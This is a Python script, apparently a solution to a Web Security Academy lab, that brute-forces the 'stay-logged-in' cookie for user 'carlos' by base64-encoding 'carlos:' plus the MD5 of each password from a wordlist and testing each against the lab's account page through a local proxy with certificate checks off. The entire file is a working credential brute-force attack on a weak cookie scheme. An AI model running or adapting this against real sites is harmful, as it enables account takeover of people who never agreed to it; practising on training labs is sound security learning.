import requests
import urllib
import urllib3
import hashlib
import base64


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

URl = 'https://0a0800b90383c202c2d4671200000077.web-security-academy.net/my-account'

username_file = open("username.txt", "r")
password_file = open("password.txt", "r")

def getCookies(file1):
    for password in file1.readlines():
        password = password.strip("\n")
        result = hashlib.md5(password.encode())
        password = result.hexdigest()
        password = "carlos:" + password
        password = (base64.b64encode(password.encode("ascii"))).decode("ascii")
        Cookies = {'session' : 'etxQIut4NoWytJYWJVrDCCKjTX9HMVmU', 'stay-logged-in' : password}
        r = requests.get(URl, cookies=Cookies, verify=False, proxies=proxies)
        if 'Login' in r.text:
            print("Currently at %s Cookies..." %password)
        else:
            print("Found! %s is a valid Cookie for carlos!" % (password))
            break

getCookies(password_file)